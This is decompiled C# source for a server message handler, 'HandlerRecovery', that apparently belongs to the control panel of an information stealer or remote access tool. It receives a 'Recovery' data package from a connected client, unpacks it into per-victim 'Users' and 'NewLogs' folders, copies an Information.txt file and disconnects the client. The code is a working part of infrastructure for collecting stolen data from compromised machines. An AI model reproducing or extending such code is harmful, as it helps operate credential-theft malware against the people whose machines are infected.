using System;
using System.Drawing;
using System.IO;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages
{
	// Token: 0x02000056 RID: 86
	internal class HandlerRecovery
	{
		// Token: 0x060001E2 RID: 482 RVA: 0x0001DEFC File Offset: 0x0001C0FC
		public static void Read(Clients clients, object[] array)
		{
			string ip = clients.IP;
			string str = "Save logs in: Users\\";
			object obj = array[1];
			Methods.AppendLogs(ip, str + ((obj != null) ? obj.ToString() : null) + "\\Recovery", Color.MediumPurple);
			string str2 = "Users\\";
			object obj2 = array[1];
			PaleFileProtocol.Unpack(str2 + ((obj2 != null) ? obj2.ToString() : null) + "\\Recovery", array[2] as byte[]);
			string str3 = "NewLogs\\";
			object obj3 = array[1];
			PaleFileProtocol.Unpack(str3 + ((obj3 != null) ? obj3.ToString() : null), array[2] as byte[]);
			File.Copy("Users\\" + (array[1] as string) + "\\Information.txt", "NewLogs\\" + (array[1] as string) + "\\Information.txt");
			clients.Disconnect();
		}
	}
}
